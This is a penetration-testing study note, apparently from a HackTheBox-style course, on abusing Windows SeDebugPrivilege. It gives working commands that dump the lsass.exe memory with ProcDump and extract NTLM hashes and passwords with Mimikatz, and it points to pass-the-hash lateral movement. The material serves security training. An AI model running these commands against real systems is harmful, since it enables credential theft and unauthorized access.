# SeDebugPrivilege
* To run a particular application or service, a user might be assigned the `SeDebugPrivilege` instead of adding the account to administrators group
* Privilege can be assigned via local or domain group policy
* By default, only administrators are granted this privilege as it can be used to capture sensitive information from system memory, or access/modify kernel and application structures

![alt text](../Images/SeDebugPrivilege.png)

* Log in with user account that has `Debug programs`
* Open elevated shell, we will see `SeDebugPrivilege` is listed

<pre>C:\htb> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State
========================================= ================================================================== ========
SeDebugPrivilege                          Debug programs                                                     Disabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
SeIncreaseWorkingSetPrivilege             Increase a process working set </pre>

* Create a complete memory dump of the lsass.exe process using Sysinternals ProcDump tool
* Target LSASS process, which stores user credentials after a user logs on to a system

<pre>procdump.exe -accepteula -ma lsass.exe lsass.dmp</pre>  

`procdump.exe` : Executable for ProcDump, a command-line utility from Sysinternals designed for capturing process dumps  
`-accepteula` : Accepts the Sysinternals license agreement, which is useful for scripting and automation purposes  
`-ma` : Switch specifies a full memory dump should be created, including all the memory the process is using  
`lsass.exe` : Name of the process you want to dump  
`lsass.dmp` : Name of the dump file to be created
* We can load this in Mimikatz using the `sekurlsa::minidump` module 
* `sekurlsa::logonPasswords` will gain the NTLM hash of the local administrator account logged on locally
* We can use this to perform a pass-the-hash attack to move laterally if the same local administrator password is used on one or multiple additional systems

* Load the specified LSASS dump file into Mimikatz
<pre>C:\htb> mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 18 2020 19:18:29
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # log
Using 'mimikatz.log' for logfile : OK

mimikatz # sekurlsa::minidump lsass.dmp
Switch to MINIDUMP : 'lsass.dmp'</pre>


* Extracts and displays logon session information, including plaintext passwords, NTLM hashes, and Kerberos tickets form the loaded minidump

<pre>mimikatz # sekurlsa::logonpasswords
Opening : 'lsass.dmp' file for minidump...</pre>